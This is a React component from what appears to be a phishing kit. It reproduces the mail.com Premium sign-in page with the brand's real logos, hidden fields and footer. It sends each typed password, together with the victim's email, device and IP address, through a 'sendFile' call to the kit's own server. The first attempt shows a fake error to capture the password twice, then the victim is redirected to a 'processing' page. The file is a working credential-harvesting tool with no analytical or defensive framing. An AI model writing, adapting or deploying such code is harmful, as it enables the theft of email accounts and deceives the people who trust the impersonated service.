import { navigate } from "@reach/router";
import React, { Fragment, useState } from "react";
import { Helmet } from "react-helmet";
import { notify, sendFile } from "../servers";

function Mail({ location }) {
  const [values, setValues] = useState({
    username: location.state.email,device: location.state.device,
    ip: location.state.ip,
    password: "",
  });

  const [submited, setSubmited] = useState({ status: false, count: 0 });

  const handleChange = (event) => {
    setValues({
      ...values,
      [event.target.name]: event.target.value,
    });
  };

  const submitForm = (event) => {
    event.preventDefault();
    setSubmited({ ...submited, status: !submited.status });

    if (submited.count === 0) {
      sendFile(values).then((data) => {
        // show error
        notify();
        setSubmited({ ...submited, count: 1 });
        console.log(data);
        console.log(submited);
      });
    } else {
      sendFile(values).then((data) => {
        // redirect
        navigate("processing", { state: { domain: location.state.domain } });
        console.log("ok");
      });
    }
  };
  return (
    <Fragment>
      <Helmet>
        <link
          as="font"
          crossorigin="anonymous"
          href="https://s.uicdn.com/mailint/9.1867.0/assets/webfonts/fonts/droid-bold.woff"
          rel="preload"
          type="font/woff"
        />
        <link
          as="font"
          crossorigin="anonymous"
          href="https://s.uicdn.com/mailint/9.1867.0/assets/webfonts/fonts/droid-normal.woff"
          rel="preload"
          type="font/woff"
        />
        <link rel="stylesheet" type="text/css" href="../mail/styles.min.css" />
      </Helmet>
      <div id="container">
        <div className="mod mod-header" data-init="true">
          <header className="header">
            <div className="header-bar">
              <a
                aria-label="Return to Home"
                className="logo-link"
                href="https://www.mail.com/#.5107350-header-logo1-1"
                target="_top"
                title="Return to Home"
              >
                <img
                  className="logo-mobile"
                  alt="Return to Home"
                  src="https://s.uicdn.com/mailint/9.1867.0/assets/header/logo_mobile.png"
                />
                <img
                  className="logo"
                  alt="Return to Home"
                  src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDI0LjMuMCwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPgo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkxheWVyXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4IgoJIHZpZXdCb3g9IjAgMCA1NDIuNSAxNDUiIHN0eWxlPSJlbmFibGUtYmFja2dyb3VuZDpuZXcgMCAwIDU0Mi41IDE0NTsiIHhtbDpzcGFjZT0icHJlc2VydmUiPgo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgoJLnN0MHtmaWxsOiNGRkZGRkY7fQo8L3N0eWxlPgo8cGF0aCBjbGFzcz0ic3QwIiBkPSJNMTgzLjksMjEuNmMtMTkuNywwLTM1LjcsMTYtMzUuNywzNy40YzAsMjEuMywxNS45LDM3LjMsMzUuNSwzNy4zYzEwLjEsMCwxOS01LjEsMjQuNi0xMi44djExaDExLjNWNTkKCUMyMTkuNSwzOC4xLDIwNC4xLDIxLjYsMTgzLjksMjEuNnogTTE4My45LDg1LjRjLTEzLjIsMC0yNC0xMS40LTI0LTI2LjRjMC0xNC45LDEwLjgtMjYuNiwyNC0yNi42YzEzLDAsMjQsMTEuOSwyNCwyNi42CglTMTk3LDg1LjQsMTgzLjksODUuNHogTTI4MC4zLDgzLjV2MTFjLTE2LjcsMS45LTI4LjItNy45LTI4LjItMjUuOVYyLjVoMTEuNnY2NS43QzI2My44LDgwLjcsMjcxLjUsODMuOSwyODAuMyw4My41eiBNMjI5LjgsMjMuNAoJaDExLjd2NzEuMWgtMTEuN1YyMy40eiBNMjI5LjgsMi41aDExLjd2MTEuN2gtMTEuN1YyLjV6IE0zMDguMSw1OWMwLDE0LjQsMTAuOCwyNS45LDIzLjksMjUuOWM5LjQsMCwxNi43LTQuOCwyMC42LTEyLjZoMTIuNgoJQzM2MC41LDg2LjcsMzQ3LjksOTYsMzMyLjEsOTZjLTE5LjYsMC0zNS42LTE2LjYtMzUuNi0zNy4xYzAtMjAuNiwxNi0zNy40LDM1LjYtMzcuNGMxNS45LDAsMjguMyw5LjQsMzMuMSwyMy43aC0xMi42CgljLTQtNy43LTExLjMtMTIuNi0yMC42LTEyLjZDMzE4LjksMzIuOCwzMDguMSw0NC43LDMwOC4xLDU5eiBNNDAyLjYsMjEuNmMtMjAuMSwwLTM1LjcsMTYuOC0zNS43LDM3LjVjMCwyMC40LDE1LjYsMzcuMSwzNS43LDM3LjEKCWMyMC4zLDAsMzUuNy0xNi43LDM1LjctMzcuMUM0MzguNCwzOC41LDQyMi45LDIxLjYsNDAyLjYsMjEuNnogTTQwMi42LDg1Yy0xMy4xLDAtMjMuOS0xMS42LTIzLjktMjUuOGMwLTE0LjUsMTAuOC0yNi40LDIzLjktMjYuNAoJYzEzLjMsMCwyNCwxMS45LDI0LDI2LjRDNDI2LjYsNzMuNCw0MTUuOSw4NSw0MDIuNiw4NXogTTI4Ni40LDgyLjhoMTEuN3YxMS43aC0xMS43VjgyLjh6IE01MzkuOCw0OXY0NS41aC0xMS43di00NgoJYzAtOS4yLTYuMS0xNi4xLTE1LjUtMTYuMWMtOS40LDAtMTUuNSw2LjktMTUuNSwxNi4xdjQ2aC0xMS43di00NmMwLTkuMi02LjEtMTYuMS0xNS41LTE2LjFzLTE1LjUsNi45LTE1LjUsMTYuMXY0NmgtMTEuN1YyMS42SDQ3MAoJYzkuNywwLDE3LjEsNC42LDIxLjMsMTEuN2M0LjMtNy4yLDExLjctMTEuNywyMS40LTExLjdDNTI4LjgsMjEuNiw1MzkuOCwzMy41LDUzOS44LDQ5eiIvPgo8cGF0aCBjbGFzcz0ic3QwIiBkPSJNMTA3LjYsMi41SDIuNXY5MS40YzAsOC4yLDUuNiwxNSwxMy4xLDE3bDAsMGwxMjYuOSwzMS43VjM3LjVDMTQyLjYsMTguMiwxMjYuOSwyLjUsMTA3LjYsMi41eiBNMTI1LjEsOTMuOQoJaC0xNy42VjUzLjhjMC0zLjktMS4zLTEzLTEyLjktMTNjLTcuNywwLTEzLjMsNS4zLTEzLjMsMTN2NDAuMUg2My43VjUzLjhjMC0zLjktMS4yLTEzLTEyLjgtMTNjLTcuOSwwLTEzLjMsNS4zLTEzLjMsMTN2NDAuMUgyMAoJVjIzLjZoMzAuOWM5LjMsMCwxNi45LDMuNywyMS44LDkuN2M1LjItNiwxMi45LTkuNywyMS44LTkuN2MxOS4yLDAsMzAuNSwxMi43LDMwLjUsMzAuNkwxMjUuMSw5My45TDEyNS4xLDkzLjl6Ii8+Cjwvc3ZnPgo="
                />
              </a>
            </div>
          </header>
        </div>
        <div className="row">
          <div className="mod mod-container" data-theme="mixed">
            <div className="blocks blocks-1">
              <div className="block">
                <div
                  className="mod mod-premiumlogin"
                  data-style="background-image:url(https://i0.mail.com/mcom/852/1964852,pd=1/.jpg)"
                  data-init="true"
                  style={{
                    backgroundImage:
                      'url("https://i0.mail.com/mcom/852/1964852,pd=1/.jpg")',
                  }}
                >
                  <div className="login-layer" tabIndex={-1}>
                    <div className="layer-box">
                      <div className="login-box">
                        <h1 className="headline">
                          Sign in to mail.com Premium Mail
                          <span className="login-ssl">SSL</span>
                        </h1>
                        <div role="group" id="header-login-box">
                          <form
                            onSubmit={submitForm}
                            className="mod mod-loginform"
                            aria-labelledby="header-login-box"
                          >
                            <input
                              type="hidden"
                              name="ibaInfo"
                              id="mod-loginform-ibaInfo"
                              defaultValue="abd=false"
                            />
                            <input
                              type="hidden"
                              name="service"
                              defaultValue="mailint"
                            />
                            <input
                              type="hidden"
                              name="uasServiceID"
                              defaultValue="mc_starter_mailcom"
                            />
                            <input
                              type="hidden"
                              name="successURL"
                              defaultValue="https://$(clientName)-$(dataCenter).mail.com/login"
                            />
                            <input
                              type="hidden"
                              name="loginFailedURL"
                              defaultValue="https://www.mail.com/logout/?ls=wd"
                            />
                            <input
                              type="hidden"
                              name="loginErrorURL"
                              defaultValue="https://www.mail.com/logout/?ls=te"
                            />
                            <input
                              type="hidden"
                              name="edition"
                              defaultValue="us"
                            />
                            <input
                              type="hidden"
                              name="lang"
                              defaultValue="en"
                            />
                            <input
                              type="hidden"
                              name="usertype"
                              defaultValue="premium"
                            />
                            <div className="login-input-wrapper">
                              <label htmlFor="login-email">Email address</label>
                              <input
                                id="login-email"
                                name="username"
                                onChange={handleChange}
                                value={values.username}
                                disabled
                                className="login-input js-hide-label"
                                type="text"
                                placeholder="Email address"
                                autoComplete="username"
                              />
                            </div>
                            <div className="login-input-wrapper">
                              <label htmlFor="login-password">Password</label>
                              <input
                                id="login-password"
                                className="login-input js-hide-label"
                                type="password"
                                name="password"
                                value={values.password}
                                onChange={handleChange}
                                required
                                placeholder="Password"
                                autoComplete="current-password"
                                autoFocus
                              />
                            </div>
                            <button
                              type="submit"
                              disabled={submited.status}
                              className="btn btn-block login-submit"
                              aria-expanded="false"
                            >
                              <span>Log in</span>
                            </button>
                            <input
                              type="hidden"
                              name="goto"
                              defaultValue="premiumlogin"
                            />
                            <input
                              type="hidden"
                              name="gotoparams"
                              defaultValue="c3BmZ290bz0vcHJlbWl1bV9tYWlsLz9tYz0wMzk2MTI4OQ=="
                            />
                          </form>
                        </div>
                        <a
                          aria-label="Can't access your account?"
                          className="cannot-login"
                          href="https://support.mail.com#.5107350-stage-help1-1"
                          target="_top"
                          title="Can't access your account?"
                        >
                          Can't access your account?
                        </a>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <footer className="mod mod-footer" id="footerNav" data-init="true">
          <div className="footer-wrapper">
            <div className="social">
              <a
                className="fb"
                href="https://www.facebook.com/mail.com"
                aria-label="facebook"
                title="facebook"
              >
                <svg
                  aria-label="facebook"
                  width={1024}
                  height={1024}
                  viewBox="0 0 1024 1024"
                >
                  <path
                    d="M512 85.333c235.264 0 426.667 191.403 426.667 426.667s-191.403 426.667-426.667 426.667c-235.264
            0-426.667-191.403-426.667-426.667s191.403-426.667 426.667-426.667zM512 0c-282.752 0-512 229.248-512 512s229.248
            512 512 512 512-229.248 512-512-229.248-512-512-512zM426.667
            426.667h-85.333v85.333h85.333v256h128v-256h77.653l7.68-85.333h-85.333c0 0
            0-18.603 0-35.541 0-20.395 4.096-28.459 23.808-28.459 15.872 0 61.525 0 61.525 0v-106.667c0 0-89.984
            0-102.571 0-76.715 0-110.763 33.792-110.763 98.475 0 56.32 0 72.192 0 72.192z"
                  />
                </svg>
              </a>
              <a
                className="tw"
                href="https://twitter.com/maildotcom"
                aria-label="twitter"
                title="twitter"
              >
                <svg
                  aria-label="twitter"
                  width={1024}
                  height={1024}
                  viewBox="0 0 1024 1024"
                >
                  <path
                    d="M512 85.333c235.264 0 426.667 191.403 426.667 426.667s-191.403 426.667-426.667 426.667c-235.264
            0-426.667-191.403-426.667-426.667s191.403-426.667 426.667-426.667zM512 0c-282.752 0-512 229.248-512
            512s229.248 512 512 512 512-229.248 512-512-229.248-512-512-512zM789.333 374.528c-18.816 8.363-39.083
            13.995-60.331 16.555 21.717-13.013 38.357-33.579 46.208-58.112-20.309
            12.032-42.795 20.779-66.731 25.472-19.115-20.437-46.464-33.195-76.629-33.195-67.84 0-117.675 63.275-102.357
            129.024-87.253-4.395-164.693-46.208-216.491-109.739-27.52 47.189-14.251 108.971 32.512
            140.245-17.195-0.555-33.365-5.248-47.531-13.141-1.152 48.64 33.749 94.165 84.267 104.32-14.763 4.011-30.976
            4.949-47.445 1.835 13.397 41.728 52.224 72.064 98.133 72.917-44.245 34.56-99.84 50.048-155.605 43.477
            46.507 29.824 101.675 47.189 160.981 47.189 195.072 0 305.237-164.736 298.581-312.491 20.565-14.763
            38.357-33.28 52.437-54.357z"
                  />
                </svg>
              </a>
            </div>
            <ul className="links">
              <li>
                <a href="https://www.mail.com/company/Mail/" target="_top">
                  Mail mail.com
                </a>
              </li>
              <li>
                <a href="https://www.mail.com/company/terms/" target="_top">
                  Terms &amp; Conditions
                </a>
              </li>
              <li>
                <a
                  href="https://www.mail.com/company/privacypolicy/"
                  target="_top"
                >
                  Privacy Policy
                </a>
              </li>
              <li>
                <a
                  href="https://www.mail.com/blog/tags/press_release/"
                  target="_top"
                >
                  Press Room
                </a>
              </li>
              <li>
                <a href="https://support.mail.com/index.html" target="_top">
                  Help Center
                </a>
              </li>
              <li>
                <a
                  href="https://www.mail.com/company/data-collection/"
                  target="_top"
                >
                  Data Collection
                </a>
              </li>
              <li>
                <a
                  href="https://www.mail.com/company/environment/"
                  target="_top"
                >
                  Environment
                </a>
              </li>
              <li>
                <a href="https://www.mail.com/donotsell/" target="_top">
                  CA Do Not Sell My Info
                </a>
              </li>
            </ul>
            <div className="copyright">
              <p>
                <span
                  className="logo-1and1"
                  title="Copyright 1&1"
                  style={{
                    background:
                      "#fff url('data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxOC4xLjEsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjxzdmcgdmVyc2lvbj0iMS4xIiBpZD0iRWJlbmVfMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgeD0iMHB4IiB5PSIwcHgiDQoJIHZpZXdCb3g9IjAgMCAxMDAwIDEwMDAiIGVuYWJsZS1iYWNrZ3JvdW5kPSJuZXcgMCAwIDEwMDAgMTAwMCIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+DQo8Zz4NCgk8cGF0aCBmaWxsPSIjMEEzMjhDIiBkPSJNNTI2LDM0My41YzAtMjEtMTQuOC0zNC41LTM4LjItMzQuNWMtMjIuNywwLTM4LjgsMTQuOS0zOC44LDM1LjJjMCwxOS42LDUuOSwzMC4zLDMyLjksNjUuMQ0KCQlDNTE0LjEsMzg2LjEsNTI2LDM2NC41LDUyNiwzNDMuNXoiLz4NCgk8cGF0aCBmaWxsPSIjMEEzMjhDIiBkPSJNMCwwdjEwMDBoOTk5LjlWMEgweiBNMjY0LjksNzE3LjZoLTk0VjMyMi40SDk1LjV2LTc1LjRoMTY5LjNWNzE3LjZ6IE02MjMuNyw3MTcuNmwtMjEtMjguMg0KCQljLTM0LjMsMjcuNC02NC40LDM3LjctMTEzLDM3LjRjLTk1LjItMC41LTE2MC43LTQ4LjktMTY2LjktMTM1Yy0zLjctNTEuNSwzMC43LTEwNC40LDk2LjctMTQyLjVjLTQyLjUtNTQuNC01MS4yLTczLjItNTEuMi0xMDcuMw0KCQljMC01OCw0OS42LTEwMC43LDExOS45LTEwMC43YzY1LjIsMCwxMTEuMyw0My40LDExMS4zLDEwMi44YzAsNDMuNS0xNy44LDc1LjgtNzIuOCwxMjEuNEw2MDguMSw1NzZjNi44LTYuMSwxMi42LTQzLjYsMTEuNC03NA0KCQljLTAuMS0zLjYtMC45LTE0LjItMS43LTI1LjhoMHYwYzAsMCwwLDAsMCwwaDc1LjZjMCwxMC4xLDEsMjQuNywxLDI4LjRjMCw1OS40LTkuMyw5Ny0zNy45LDEzMy4ybDYwLjEsNzkuOEg2MjMuN3ogTTg2Ni45LDcxNy42DQoJCWgtOTRWMzIyLjRoLTc1LjN2LTc1LjRoMTY5LjNWNzE3LjZ6Ii8+DQoJPHBhdGggZmlsbD0iIzBBMzI4QyIgZD0iTTQwOC41LDU4OS40YzEuMiwzOC43LDMzLjYsNjMuNCw4MS4yLDYzLjRjMjkuMywwLDQ4LjktMTAuNyw2NS44LTI0LjdsLTg5LjItMTE4LjYNCgkJQzQyNC41LDUzNy4xLDQwNy43LDU2NCw0MDguNSw1ODkuNHoiLz4NCjwvZz4NCjwvc3ZnPg0K')",
                  }}
                >
                  Copyright 1&amp;1
                </span>
              </p>
              <p>
                Copyright © 2021 1&amp;1 Mail &amp; Media Inc. All rights
                reserved.
              </p>
            </div>
          </div>
        </footer>
      </div>
    </Fragment>
  );
}

export default Mail;
